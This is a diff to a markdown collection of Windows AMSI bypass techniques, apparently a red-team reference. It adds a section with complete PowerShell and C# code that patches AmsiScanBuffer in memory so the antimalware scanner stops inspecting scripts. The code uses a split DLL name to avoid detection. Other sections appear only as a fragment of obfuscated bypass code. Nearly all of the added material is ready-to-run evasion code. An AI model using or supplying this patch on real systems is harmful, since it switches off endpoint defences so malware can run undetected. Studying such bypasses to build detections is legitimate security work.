@@ -16,6 +16,7 @@ Some of the more well known Bypasses are detected by AMSI itself. So you have to
 11. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
 12. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
 13. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
+14. [Patch .NET 4.8](#Patch-.NET-4.8 "Goto Patch-.NET-4.8")
 
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse #
 ```
@@ -630,4 +631,74 @@ Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(e
     }
 
 }
+```
+
+
+# Patch .NET 4.8#
+Bypass Update by Adam Chester https://twitter.com/_xpn_/status/1170852932650262530
+```
+$Winpatch = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class patch
+{
+    // https://twitter.com/_xpn_/status/1170852932650262530
+    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+    public static void it()
+    {
+        if (is64Bit())
+            PatchAmsi(x64);
+        else
+            PatchAmsi(x86);
+    }
+
+    private static void PatchAmsi(byte[] patch)
+    {
+        try
+        {
+            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
+            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");
+
+            uint oldProtect;
+            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+            Marshal.Copy(patch, 0, addr, patch.Length);
+            Console.WriteLine("Patch Sucessfull");
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(" [x] {0}", e.Message);
+            Console.WriteLine(" [x] {0}", e.InnerException);
+        }
+    }
+
+    private static bool is64Bit()
+        {
+            bool is64Bit = true;
+
+            if (IntPtr.Size == 4)
+                is64Bit = false;
+
+            return is64Bit;
+        }
+}
+
+class Win32
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type -TypeDefinition $Winpatch -Language CSharp
+[patch]::it()
 ```
